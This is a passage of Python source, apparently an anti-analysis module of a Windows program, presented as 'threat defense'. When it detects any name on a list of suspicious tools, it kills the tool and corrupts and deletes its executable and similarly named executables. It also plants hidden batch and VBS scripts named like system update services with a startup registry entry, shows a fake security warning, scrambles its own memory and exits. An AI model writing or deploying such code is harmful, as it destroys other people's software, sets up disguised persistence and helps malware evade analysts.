    def _terminate_process_by_name(self, process_name):
        try:
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'].lower() == process_name.lower():
                        pid = proc.info['pid']
                        process = psutil.Process(pid)
                        
                        process.terminate()
                        
                        try:
                            process.wait(5)
                        except psutil.TimeoutExpired:
                            process.kill()
                            
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
            return False
        except:
            return False
            
    def _try_delete_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return False
                
            os.remove(file_path)
            return True
        except:
            try:
                temp_bat = os.path.join(os.environ['TEMP'], f"delete_{int(time.time())}.bat")
                with open(temp_bat, 'w') as f:
                    f.write(f'@echo off\n')
                    f.write(f'ping -n 3 127.0.0.1 > nul\n')
                    f.write(f'del /F /Q "{file_path}"\n')
                    f.write(f'del /F /Q "%~f0"\n')
                
                subprocess.Popen(['cmd', '/c', temp_bat], 
                                 shell=True, 
                                 stdin=subprocess.PIPE, 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE,
                                 creationflags=subprocess.CREATE_NO_WINDOW)
                return True
            except:
                return False
                
    def _disable_threat_autorun(self, file_path):
        try:
            reg_locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
            ]
            
            file_name = os.path.basename(file_path).lower()
            
            for hkey, key_path in reg_locations:
                try:
                    reg_key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_READ | winreg.KEY_WRITE)
                    
                    try:
                        i = 0
                        while True:
                            name, value, _ = winreg.EnumValue(reg_key, i)
                            
                            if file_name in value.lower():
                                winreg.DeleteValue(reg_key, name)
                                self._log(f"Auto-startup record deleted: {name} => {value}")
                                
                            i += 1
                    except WindowsError:
                        pass
                        
                    winreg.CloseKey(reg_key)
                except WindowsError:
                    continue
                    
            return True
        except:
            return False
    
    def _inject_threat_preventer(self, threat_path):
        try:
            if not os.path.exists(threat_path):
                return False
                
            threat_dir = os.path.dirname(threat_path)
            threat_name = os.path.basename(threat_path)
            threat_base, threat_ext = os.path.splitext(threat_name)
            
            defender_bat = os.path.join(threat_dir, f"{threat_base}_helper.bat")
            defender_vbs = os.path.join(threat_dir, f"{threat_base}_update.vbs")
            
            with open(defender_bat, 'w') as f:
                f.write('@echo off\n')
                f.write(f'title System Update Service\n')
                f.write(f'echo System updating...\n')
                f.write(f'if exist "{threat_path}" (\n')
                f.write(f'  attrib -r -s -h "{threat_path}"\n')
                f.write(f'  del /f /q "{threat_path}"\n')
                f.write(f'  echo Threat removed.\n')
                f.write(f')\n')
                f.write(f'exit\n')
                
            with open(defender_vbs, 'w') as f:
                f.write(f'Set objShell = CreateObject("WScript.Shell")\n')
                f.write(f'objShell.Run "cmd /c ""{defender_bat}""", 0, False\n')
                
            try:
                subprocess.run(['attrib', '+h', '+s', defender_bat], check=False, creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.run(['attrib', '+h', '+s', defender_vbs], check=False, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
                
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                       r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                       0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, "SystemSecurityService", 0, winreg.REG_SZ, defender_vbs)
                winreg.CloseKey(reg_key)
            except:
                pass
                
            try:
                subprocess.Popen(['wscript', defender_vbs], 
                               stdin=subprocess.PIPE, 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE,
                               creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
                
            return True
        except:
            return False
                
    def _corrupt_threat_executable(self, file_path):
        try:
            if not os.path.exists(file_path):
                return False
                
            try:
                with open(file_path, "r+b") as f:
                    header = f.read(8)
                    
                    f.seek(0)
                    f.write(os.urandom(8))
                    f.flush()
            except:
                pass
                
            return True
        except:
            return False
            
    def _aggressive_defense(self, threat_process_name, threat_reason):
        try:
            self._log(f"Defense started: {threat_process_name} ({threat_reason})")
            
            threat_path = None
            threat_pid = None
            
            try:
                for proc in psutil.process_iter(['name', 'pid', 'exe']):
                    try:
                        if threat_process_name.lower() in proc.info['name'].lower():
                            threat_path = proc.info.get('exe', '')
                            threat_pid = proc.info.get('pid', 0)
                            break
                    except:
                        continue
                        
                if not threat_pid:
                    self._log(f"Threat not found: {threat_process_name}")
                    return False
                    
                self._log(f"Threat detected: PID={threat_pid}, Path={threat_path}") 
            except Exception as e:
                self._log(f"Threat search error: {str(e)}")
            
            try:
                if threat_pid:
                    try:
                        process_handle = ctypes.windll.kernel32.OpenProcess(
                            0x0001,
                            False, 
                            threat_pid
                        )
                        
                        if process_handle:
                            ctypes.windll.kernel32.TerminateProcess(process_handle, 1)
                            ctypes.windll.kernel32.CloseHandle(process_handle)
                            self._log(f"Threat terminated via Windows API: {threat_process_name}")
                    except Exception as e:
                        self._log(f"Windows API termination error: {str(e)}")
                
                try:
                    self._terminate_process_by_name(threat_process_name)
                except Exception as e:
                    self._log(f"Psutil termination error: {str(e)}")
            except Exception as e:
                self._log(f"Process termination error: {str(e)}")
                
            if threat_path and os.path.exists(threat_path):
                try:
                    self._corrupt_threat_executable(threat_path)
                    self._log("Threat file corrupted")
                    
                    if self._try_delete_file(threat_path):
                        self._log("Threat file marked for deletion")
                    
                    self._disable_threat_autorun(threat_path)
                    self._log("Threat auto-startup blocked")
                    
                    self._inject_threat_preventer(threat_path)
                    self._log("Threat preventer injected")
                    
                    try:
                        threat_dir = os.path.dirname(threat_path)
                        if os.path.exists(threat_dir):
                            self._log(f"Scanning threat directory: {threat_dir}")
                            for file in os.listdir(threat_dir):
                                if file.endswith('.exe') and threat_process_name.lower() in file.lower():
                                    other_path = os.path.join(threat_dir, file)
                                    if other_path != threat_path:
                                        self._corrupt_threat_executable(other_path)
                                        self._try_delete_file(other_path)
                                        self._log(f"Similar threat handled: {file}")
                    except Exception as e:
                        self._log(f"Similar threat scan error: {str(e)}")
                except Exception as e:
                    self._log(f"File operations error: {str(e)}")
            
            try:
                def show_warning():
                    try:
                        import tkinter as tk
                        root = tk.Tk()
                        root.title("Security Warning")
                        root.geometry("600x300")
                        root.configure(background='black')
                        root.attributes("-topmost", True)
                        
                        label = tk.Label(
                            root, 
                            text=f"SECURITY WARNING\n\n{threat_process_name} detected as threat!\n"
                                 f"Reason: {threat_reason}\n\nThreat has been neutralized.",
                            font=("Arial", 14, "bold"),
                            fg="red",
                            bg="black",
                            pady=20
                        )
                        label.pack(expand=True)

                        root.after(4000, root.destroy)
                        root.mainloop()
                    except Exception as e:
                        self._log(f"Warning window error: {str(e)}")
                
                warning_thread = threading.Thread(target=show_warning, daemon=True)
                warning_thread.start()
                self._log("Security warning displayed")
            except Exception as e:
                self._log(f"Warning display error: {str(e)}")
            
            self._clear_memory_traces()
            
            return True
        except Exception as e:
            self._log(f"Aggressive defense error: {str(e)}")
            return False
                
    def _stealth_exit(self, reason=""):
        try:
            if not reason:
                return 
                
            if reason and any(tool.lower() in reason.lower() for tool in self.suspicious_tools):
                detected_tool = None
                for tool in self.suspicious_tools:
                    if tool.lower() in reason.lower():
                        detected_tool = tool
                        break
                
                if detected_tool:
                    print(f"    â”‚  â”œâ”€ Threat detected: {detected_tool} - Defense started")
                    self._aggressive_defense(detected_tool, reason)
                    print(f"    â”‚  â”œâ”€ Threat defense completed: {detected_tool}")
                    
                    self._clear_memory_traces()
                    print("    â”‚  â”œâ”€ Memory traces cleaned")
                    
                    print("    â”‚  â”œâ”€ SECURITY WARNING: Threat detected and program is shutting down")
                            
                    try:
                        ctypes.windll.user32.PostQuitMessage(0)
                        os._exit(0)
                    except:
                        sys.exit(1)
            else:
                print(f"    â”‚  â”œâ”€ Security check: {reason} - No action needed")
                
        except Exception as e:
            print(f"    â”‚  â”œâ”€ Stealth exit error: {str(e)}")
        
    def _clear_memory_traces(self):
        try:
            for attr_name in dir(self):
                if attr_name.startswith('_'):
                    continue
                try:
                    attr_value = getattr(self, attr_name)
                    if isinstance(attr_value, list):
                        setattr(self, attr_name, [random.randint(0, 255) for _ in range(len(attr_value))])
                    elif isinstance(attr_value, dict):
                        random_dict = {}
                        for k in attr_value.keys():
                            random_dict[k] = random.randint(0, 255)
                        setattr(self, attr_name, random_dict)
                    elif isinstance(attr_value, str):
                        setattr(self, attr_name, os.urandom(len(attr_value)).hex())
                except:
                    continue
                    
            gc.collect()
        except:
            pass

